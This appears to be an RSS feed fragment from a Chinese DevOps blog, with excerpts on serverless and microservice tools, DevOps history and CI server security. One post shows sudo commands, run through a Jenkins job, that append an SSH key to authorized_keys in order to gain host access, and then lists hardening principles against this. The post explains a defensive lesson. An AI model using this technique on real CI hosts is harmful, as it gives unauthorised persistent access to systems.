另一方面，无服务器风格的架构（Serverless architecture ）把 DevOps 技术在微服务领域的应用推向极致。当应用程序执行环境的管理被新的编程模型和平台取代后，团队的交付生产率得到了进一步的提升。一方面它免去了很多环境管理的工作，包括设备、网络、主机以及对应的软件和配置工作，使得软件运行时环境更加稳定。另一方面，它大大降低了团队采用 DevOps 的技术门槛。然而，端到端的交付以及微服务中的函数管理问题日渐突出，尽管AWS API gateway和AWS Lambda几乎成了 Serverless 架构的代名词，但这二者结合的开发者体验并不佳。于是出现了Serverless framework和CLAUDIA这样的管理工具。
AWS Lambda 带来的优势也深深影响了企业级应用领域，Apache OpenWhisk就是企业级无服务器领域的选择之一，它使得企业级应用也可以采用无服务器风格的架构构建应用程序。
在微服务端到端交付流程上，Netflix 开源了自家的Spinnaker，Netflix 作为微服务实践的先锋，不断推出新的开源工具来弥补社区中微服务技术和最佳实践的缺失。 而Spring Cloud则为开发者提供了一系列工具，以便他们在所熟悉的 Spring 技术栈下使用这些服务协调技术(coordination techniques)，如服务发现、负载均衡、熔断和健康检查。
而在微服务的安全上，最常见的需求之一是通过身份验证和授权功能来保护服务或 API。 这部分功能往往是最重要且不断重复构造的。而Keycloak就是一个开源的身份和访问管理解决方案，用于确保应用程序或微服务的安全。且几乎不需要编写代码，开箱即用。它支持单点登录，社交网络登录和标准协议登录(如 OpenID Connect ， OAuth2 和 SAML 等)。
趋势2：以 Docker 为核心的数据中心方案逐渐走向成熟 在过去的两年，Docker 社区有了突飞猛进的发展，似乎每期技术雷达都会出现 Docker 相关的条目。而 Docker 往往和 DevOps 联系起来，被认为是推动 DevOps 发展的杀手级工具，以至于有些人会以团队是否采用 Docker 作为团队是否具备 DevOps 能力的标志。</description>
    </item>
    
    <item>
      <title>不要让你的持续集成服务器成为安全隐患</title>
      <link>https://www.guyu.me/2017/2017-03-03-your-ci-may-be-under-attack/</link>
      <pubDate>Fri, 03 Mar 2017 00:00:00 +0000</pubDate>
      
      <guid>https://www.guyu.me/2017/2017-03-03-your-ci-may-be-under-attack/</guid>
      <description>最近临时接手了一个客户测试环境和产品环境的维护工作。接手的客户资产里包含：代码库，生产环境主机，测试环境主机以及搭建在测试环境主机上的CI（基于Jenkins）。这个CI可以用来部署测试环境和生产环境的应用。
不久，接到了客户的一个维护请求：把最新的生产环境数据同步到测试环境里。
这个维护工作需要通过SSH登录到测试环境主机上进行操作。测试主机是通过 authorized_keys 进行 SSH 认证的，因此没有用户名和密码。这样有两个好处：一方面无需生产环境用户名密码。一方面可以按需吊销不再用的客户端。这样可以避免密码泄露。所以我需要把自己的 ssh public key 交给管理员，让他把我的 key 加到可访问列表里。
悲剧的是，管理员告诉我他的 key 因为更换电脑的关系没有及时更新。所以，他也登录不上去了。而且之前所有的管理员的 key 都失效了。我手上只有CI的管理员的用户名和密码，于是一个邪恶的想法就诞生了：
既然 CI 可以执行脚本，那么我是否可以通过CI把我的key注入进去 ？
于是我用Execute Shell的Job变成了我的命令行，通过CI运行日志得知了宿主用户的文件目录信息。然后把自己的ssh public key加到了登录列表里（此处省略敏感信息）：
sudo sh -c “cp \~/.ssh/authorized\_keys \~/.ssh/authorized\_keys.bak” sudo sh -c &amp;quot;echo ‘{**你的****ssh public key**}’ \&amp;gt;\&amp;gt; \~/.ssh/authorized\_keys&amp;quot;  It works !
我成功的登录了机器，但这却暴露了一个问题：CI有可能会成为一个安全隐患。
首先，CI可以执行代码。这就意味着它有可能执行有害代码。
其次，CI缺乏足够的用户鉴权，这很有可能导致未授权用户访问。
那么，如何构建一个更安全的 CI 服务器 rootless原则  “神操纵着万物，你感觉得到他，但永远看不见他。” ——《圣经·希伯来书 11:27》
 在服务器的世界里，root用户就是神，具有至高的权力和力量。如果有人获得了”神力“，后果可能不堪设想。
无论是Web服务器，还是CI服务器。都是这个世界里的二等公民，权限和力量都应该受到约束。执行的时候应该“
此外，应该极力避免sudo的滥用，尤其是对那些从外部访问的用户。很多情况下，为了操作方便，很多用户都有sudo的权限。但这恰恰造成了低权限用户提升自己的访问权限进行有害操作。
在上述的故事里，因为没有对Jenkins的主机用户做有效的隔离，导致了我可以用sudo注入自己的key获得机器的访问权限。
沙盒隔离原则 因为CI会执行脚本或运行程序，而这些程序和脚本极有可能是不安全的。所以，CI任务应该在隔离的安全沙盒中执行，例如：受限的用户，受限的权限，受限的空间。
在上述的故事里，我就通过CI执行了一段不安全的脚本成功获得了登录主机的权限。
如果这些任务执行在隔离并受控的Docker容器里，那么会安全得多。
也可以考虑采用TravisCI这样的第三方CI服务来保证安全性。
备份和备份核查原则 在上述的故事里，因为缺乏有效的备份机制，导致了所有人都失去了对主机的访问。此外，我在修改authorized_keys的时候先进行了备份。这样，如果我注入失败，还可以还原。
这里的备份，不光是对配置，数据的备份，还有岗位的备份。</description>
    </item>
    
    <item>
      <title>DevOps 前世今生 - DevOps 的目标和核心</title>
      <link>https://www.guyu.me/2017/2017-02-14-core-devops-concepts/</link>
      <pubDate>Tue, 14 Feb 2017 00:00:00 +0000</pubDate>
      
      <guid>https://www.guyu.me/2017/2017-02-14-core-devops-concepts/</guid>
      <description>在#DevOps的前世今生# 2. Dev和Ops矛盾缘何而来？一文中，通过Dev和Ops的历史发展总结出了Dev和Ops矛盾的历史渊源，以及 Dev 和 Ops 的核心矛盾：
Dev和 Ops 的矛盾主要是面向适应性的敏捷软件交付和面向经验性的传统运维之间的矛盾。
但这个矛盾最先 John Allspaw 和 Paul Hammond在 “10+ Deploys Per Day： Dev and Ops Cooperation at Flickr” 提出，并以“Cooperation”作为整个演讲的核心，讲述了他们解决这个矛盾的实践经验。这个演讲中：
重新定义Ops的工作目标 在一个组织中，如果相关利益者的利益不一致，在既定流程的进行中一定会碰到诸多阻力。而在这一点上，首先做得就是把 Dev 和 Ops 的利益一致化，从而减少Ops对软件交付的阻力。在演讲中，John Allspaw 和 Paul Hammond 首先挑战的是对 Dev 和 Ops 的传统观点。
传统的观点认为Dev和Ops的工作是不同的：
Dev的工作是增添新的功能。
Ops的工作是保证站点的稳定和高性能。
他们认为，保证站点的稳定和高性能不是 Ops 的工作目标。
Ops的工作目标应该是激活业务（enable the business），而这一点和Dev是一致的。
理想往往是美好的，现实往往是残酷的。激活业务会带来更多的变更，而更多的变更会引起故障！
面对这样的问题，就需要做出一个选择：为了保障稳定性减少变更，还是及时按需变更？
阿拉伯有一个谚语：“你若不想做，会找到一个借口。你若想做，会找到一个方法。”
Flicker 并没有屈服于压力，他们选择让问题向目标妥协，而不是目标向问题妥协。他们的手段是：
构建相互合作的工具和文化 降低变更风险的关键就是在于提高可靠性，这不仅仅是Dev在软件开发中，也需要Ops把可靠性通过非功能性需求（性能要求，扩展性，安全性等）注入到软件开发过程中。通过系统交付过程中的质量內建而不是事后检验来提升交付质量。
而 Dev 和 Ops 的具体矛盾点表现在以下两方面：
在价值流下游的 Ops 评审认为价值链上游的 Dev 软件非功能质量不满足要求，因此阻止变更。
在价值流上游的 Dev 无法获得价值链下游的 Ops 的真实运行环境，因此无法提升交付质量。</description>
    </item>
    
    <item>
      <title>DevOps 前世今生 - DevOps 矛盾从何而来</title>
      <link>https://www.guyu.me/2017/2017-01-17-where-did-devops-issues-come/</link>
      <pubDate>Fri, 27 Jan 2017 00:00:00 +0000</pubDate>
      
      <guid>https://www.guyu.me/2017/2017-01-17-where-did-devops-issues-come/</guid>
      <description>在#DevOps的前世今生# 1.DevOps编年史一文中，通过追溯 DevOps 活动产生的历史起源，我们发现了 DevOps 是敏捷思想从软件开发端(Dev)到系统维护端(Ops)的延伸。无论是 DevOpsDays 的创始人 Patrick Debois，还是同时期的 The Agile Admin。都想通过敏捷来改进传统的系统维护工作以及软件开发部门和系统维护部门的合作关系。但是，DevOps 的矛盾从何而来？这还要从 Dev 和 Ops 的起源开始讲起。
上古时代——抱着计算机使用手册，自开发自运维 历史要追溯到刚刚出现计算机的时期。当时，软件开发还是少数人通过高学历才能够掌握的技能，那个时候只有“程序”（Program），但没有“软件”（Software），所以那个时候编写程序的人员被称为“程序员”（Programmer）。基本的学习材料还只是计算机设备厂商附送的使用手册。所以，只能先购买设备，再自己培养人才。
最先购买计算机的是科研单位，军队，政府以及少数大型企业。同时组建了新的部门，成立了信息技术部（IT Department)，或者叫信息化办公室（IT Office）。在中国的有些单位里干脆直接叫“电脑部”。他们一个科室，一个办公室主任，外加两三个科级干部和几个科员，专门管理这些电脑的使用情况，并且学习软件编程技术，用程序来解决其它各部门的。
这是最初的IT运维雏形，在这个时期是没有 Dev 和 Ops 之分的，他们统称为 Programmer。由于开发和运维都由同样的人包揽，自己维护自己开发的程序，也可以被看做是原始的 DevOps。这个时期的计算机系统和问题较简单，开发和维护并不复杂，无需进行专业区分。
桌面通用软件时代——软件成为了一门生意，出现了专业的软件开发工程师（Dev） 随着计算机的成本不断下降，尤其是以 IBM PC 为代表微型计算机（ MicroComputer ）开始普及。企业也开始大规模使用计算机进行办公。由于软件开发人员数量仍然很少，加之需求很旺盛，专业的软件开发人员成本依然高昂。
最开始的时候，软件仅仅通过磁盘拷贝进行流传，某些介绍计算机或者软件的杂志开了先河。程序员通过磁盘向杂志社投稿，杂志社通过变卖杂志和软件获利。由于软件的边际生产成本几乎是0，所以渐渐有人把销售软件变成了一门生意。随着软件的扩展，当初为个人目的（Personal Purpose）所编写的软件渐渐的开始走通用化的路线，慢慢形成了软件产品。接着有了专门从事软件开发的公司，并逐渐成为一个产业。并且有了软件开发工程师（Developer，简称Dev）这个职业。
在这个时期，开发软件仍然是很专业的事情，企业的IT部门要想开发软件的代价十分高昂。因此，大部分单位，组织和企业通过购买的形式获得软件。IT部门逐渐成为了负责信息化采购以及软硬件基本操作培训的部门。此外，由于信息化发展加速，各行各业软件层出不穷，加之软件企业越来越多，IT部门不得不通过更广泛的学习了解技术的变化。
企业级定制化软件时代——企业级应用的快速发展，出现了专业的系统维护工程师（Ops） 随之带来的问题是：无论企业买来多少软件，企业的信息化需要仍然无法被满足。一台台电脑成为了企业的信息孤岛，解决了信息的分析和存储问题最多实现了无纸化办公。没有让部门间的信息有效的流动起来。大型企业最先发现这些问题并且给出了最初的解决方案，使得企业级软件开发和系统集成（System Integration）慢慢成为了一个热门的领域。
企业级软件系统最大的特点是通过计算机网络解决了企业内部的信息孤岛。但这样的系统无法在PC上运行需要专业的工作站，服务器以及网络设备。而这些设备的管理就理所当然的成为了企业IT部门的职责。
随着软硬件技术的发展，特别企业级应用开发的经验不断积累，设备的采购成本和软件的开发成本进一步降低。大型IT厂商开始瞄准企业级应用市场，尤其是IBM，Oracle和EMC推出了相应的产品。使得软件定制开发的成本不断下降。加之随着开发人员越来越多，开发成本逐渐降低，于是出现了企业定制化软件开发，出现了MIS和ERP这样的应用以及J2EE这样的企业级软件开发框架。
在这个过程中，IT运维的概念逐渐产生，维基百科上是这样定义IT运维（IT Operations）的：
 IT Operations is responsible for the smooth functioning of the infrastructure and operational environments that support application deployment to internal and external customers, including the network infrastructure; server and device management; computer operations; IT infrastructure library (ITIL) management; and help desk services for an organization.</description>
    </item>
    
    <item>
      <title>DevOps 前世今生 - DevOps 编年史</title>
      <link>https://www.guyu.me/2016/2016-11-27-devops-annals/</link>
      <pubDate>Sun, 27 Nov 2016 00:00:00 +0000</pubDate>
      
      <guid>https://www.guyu.me/2016/2016-11-27-devops-annals/</guid>
      <description>2007 年：比利时，一个沮丧的独立IT咨询师 DevOps的历史要从一个比利时的独立IT咨询师说起。这位咨询师的名字叫做Patrick Debois，他喜欢从各个角度研究IT组织。
2007 年，Patrick参与了比利时一个政府下属部门的大型数据中心迁移的项目。在这个项目中，他负责测试和验证工作。所以他不光要和开发团队（Dev）一起工作，也要和运维团队（Ops）一起工作。他第一天在开发团队跟随敏捷的节奏，第二天又要以传统的方式像消防队员那样维护这些系统，这种在两种工作氛围的切换令他十分沮丧。
他意识到开发团队和运维团队的工作方式和思维方式有巨大的差异：开发团队和运维团队生活在两个不同的世界，而彼此又坚守着各自的利益，所以在这两者之间工作到处都是冲突。作为一个敏捷的簇拥者，他渐渐的明白如何在这种状况下改进自己的工作。
2008 年 6月：美国旧金山，第一届 Velocity 大会 2008 年，在美国加州旧金山，O&amp;rsquo;Reilly出版公司举办了一场名为Velocity的技术大会，这个大会的话题范围主要围绕Web应用程序的性能和运维展开。这个会议被设计用来分享和交换构建和运维Web应用的性能、稳定性和可用性上的最佳实践。
2008 年 8月：加拿大多伦多，Agile Conference 2008 大会埋下了DevOps的种子 同年 8月，在加拿大多伦多的 Agile Conference 2008（敏捷大会）上，一位名为 Andrew Shafer 的人提交了一个名为“Agile Infrastructure”的临时话题。由于对这个临时话题感兴趣的人不多，Andrew 认为没人会对如何 跨越 Dev 和 Ops 的鸿沟 这个话题感兴趣。所以当这个话题时间开始的时候，作为话题提交人的 Andrew 并没有出现。
但是话题开始的时候，仅有一个人出席。这个人就是上文提到的IT咨询师 Patrick 。Partrik 在这次会议上分享了自己的话题：如何在运维工作中应用 Scrum 和其它敏捷实践。他十分想把这些经历和别人分享。
最终，Patrick 在会议厅的走廊里找到了 Andrew，并进行了一场漫长的讨论。他们意识到在这次会议之外会有很多的人想要继续探讨这个广泛而又系统化的问题。
尽管在这次会议中，持续集成的流行已经使敏捷实践慢慢走向部署了。可是这仍然把运维工作和开发完全割裂开。于是他俩决定在 Google Group 上建立了一个 Agile System Adminstration 的讨论组继续这个话题。虽然有一些话题和参与者，但是访问者寥寥。
2009 年 6月：美国圣荷西，第二届 Velocity 大会上一个轰动世界的演讲 这一年的 Velocity 大会最大的亮点是一个名为“10+ Deploys Per Day: Dev and Ops Cooperation at Flickr”的演讲，几乎所有的和 DevOps 相关的资料都会把这个演讲作为 DevOps 的引用。这个演讲的内容可以作为 DevOps 萌发的标志。这个演讲提出了了 DevOps 的“一个中心，两个基本点”——以业务敏捷为中心，构造适应快速发布软件的工具（Tools）和文化（Culture）。</description>
    </item>
    
  </channel>
</rss>